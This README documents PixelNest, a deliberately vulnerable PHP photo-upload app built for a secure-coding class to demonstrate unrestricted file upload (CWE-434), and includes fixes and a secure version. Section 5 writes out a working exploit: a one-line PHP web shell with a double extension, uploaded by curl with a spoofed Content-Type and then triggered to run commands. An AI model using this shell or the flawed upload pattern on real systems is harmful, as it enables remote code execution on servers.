# PixelNest — Insecure File Upload (CWE-434) Demo

> **Assigned vulnerability:** Insecure File Upload
> **Video demo:** 🔗 _[add your Google Drive link here after recording/uploading]_

This repository contains a deliberately vulnerable web application, **PixelNest**,
a tiny "upload a profile photo" site, built to demonstrate **CWE-434: Unrestricted
Upload of File with Dangerous Type**.

The full attack walkthrough and remediation explanation are in the linked video.
This README summarizes what's in the repo and how to run it.

---

## 1. What the app does (normal use)

PixelNest is a two-page app:

- `public/index.php` — a form where a user picks a JPG/JPEG/PNG file and uploads it.
- `public/gallery.php` — shows every file that has been uploaded, as a public photo grid.
- `public/upload.php` — the server-side handler that receives the upload and saves it.

Uploaded files are written into `public/uploads/`, which is served directly by the
web server — anything placed there is reachable at `http://<host>/uploads/<filename>`.

## 2. Where the vulnerability lives

All three flaws are in **`public/upload.php`**, each marked with a `[FLAW #n]`
comment in the code:

| # | Flaw | Why it's dangerous |
|---|------|---------------------|
| 1 | The "extension check" only tests whether an allowed substring (`.jpg`, `.png`, etc.) appears **anywhere** in the filename (`stripos($originalName, $goodExt)`), instead of validating the file's true final extension. | A file named `shell.jpg.php` contains `.jpg`, so it passes — but its real extension is `.php`. |
| 2 | The "type check" trusts `$_FILES['file']['type']`, which is the `Content-Type` the **client** sent in the multipart request. | Fully attacker-controlled. A tool like curl/Burp/Postman can label any file `image/jpeg` regardless of its real content. |
| 3 | The file is saved using its **original, attacker-supplied filename**, directly inside a public, script-executable directory, with no re-encoding or content verification. | Whatever name/extension the attacker chose is exactly what lands on disk and can later be requested and executed by the server. |

Individually, most of these look like "reasonable" checks — that's what makes this
bug realistic. Together they add up to: *the server trusts the filename instead of
verifying what the file actually is.*

## 3. The attack, in short

1. Attacker writes a minimal PHP web shell and names it `shell.jpg.php`.
2. Attacker uploads it through the normal form (or via `curl -F "file=@shell.jpg.php;type=image/jpeg"`),
   spoofing the `Content-Type` header to `image/jpeg`.
3. The substring check sees `.jpg` in the name → passes. The MIME check sees the
   spoofed `image/jpeg` header → passes. The file is saved as-is: `uploads/shell.jpg.php`.
4. Attacker requests `http://<host>/uploads/shell.jpg.php?cmd=id` directly.
   Because the file's real extension is `.php` and the uploads folder executes
   PHP, the server runs the attacker's code and returns command output —
   full remote code execution from an "image upload" form.

(Full live demo of this is in the video.)

## 4. How it should be fixed

See [`secure-version/`](secure-version/) — a full corrected copy of the app
(`upload.php` has short `ERROR:` / `FIX:` comments marking exactly what was
wrong and how it was fixed, plus `uploads/.htaccess` for directory hardening).
Summary of the fix:

1. **Validate the true extension** with `pathinfo($name, PATHINFO_EXTENSION)` against
   a strict allow-list, exact match — not a substring search.
2. **Verify real file content on the server**, e.g. `getimagesize()` or
   `finfo_file(..., FILEINFO_MIME_TYPE)` on the actual bytes, not the client-sent
   `Content-Type` header. Re-encoding the image (via GD/Imagick) strips any
   non-image payload appended after a valid image header.
3. **Never store the file under its original name.** Generate a random server-side
   filename and force the extension based on the *verified* type.
4. **Store uploads outside the web root**, or in a directory with script execution
   explicitly disabled (`php_flag engine off` / handler removal on Apache, or an
   Nginx `location` block that never proxies that path to PHP-FPM).
5. Defense in depth: enforce a max file size, run the upload directory through
   antivirus/content scanning if available, and set `Content-Disposition: attachment`
   plus `X-Content-Type-Options: nosniff` when serving user-uploaded files back out.

## 5. Running it locally

Requires PHP 8.x.

```bash
cd public
php -S 127.0.0.1:8000
```

Then open `http://127.0.0.1:8000/index.php`.

**To reproduce the exploit** (for your own testing only — this is your own local
instance):

```bash
# 1. Create a tiny PHP web shell disguised with a double extension
cat > shell.jpg.php << 'EOF'
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } EOF

# 2. Upload it, spoofing the Content-Type like a browser/attacker tool would
curl -F "file=@shell.jpg.php;type=image/jpeg" http://127.0.0.1:8000/upload.php

# 3. Trigger it directly
curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=id"
```

## 6. Repo structure

```
insecure-upload-demo/
├── README.md
├── public/                        ← the vulnerable app (what you run)
│   ├── index.php
│   ├── upload.php                 ← the vulnerable code (see [FLAW #1..3] comments)
│   ├── gallery.php
│   ├── style.css
│   └── uploads/                   ← where uploaded files land (web-accessible)
└── secure-version/                ← fixed, runnable copy of the whole app
    ├── index.php
    ├── upload.php                 ← ERROR/FIX comments mark each corrected flaw
    ├── gallery.php
    ├── style.css
    └── uploads/
        └── .htaccess              ← disables script execution in this folder
```

## 7. Disclaimer

Built strictly for a classroom assignment on secure coding. Do not deploy this
application, or reuse its upload-handling pattern, anywhere reachable by the public
internet.
